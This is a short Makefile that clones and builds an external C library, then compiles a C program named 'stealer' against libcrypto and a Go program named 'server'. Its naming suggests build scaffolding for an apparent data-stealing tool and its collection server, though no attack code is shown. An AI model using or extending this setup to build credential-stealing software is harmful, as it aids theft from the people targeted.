CC=gcc
CFLAGS=-Wall -std=c99
CFILES=stealer.c extclib/extclib.o

GC=go build
GFILES=server.go

.PHONY: default install build
default: install build
install:
	git clone https://github.com/number571/extclib.git
	make -C extclib/
build: $(CFILES) $(GFILES)
	$(CC) -o stealer  $(CFILES) $(CFLAGS) -lcrypto
	$(GC) -o server $(GFILES) 
clean:
	rm -rf extclib/
	rm -f stealer server
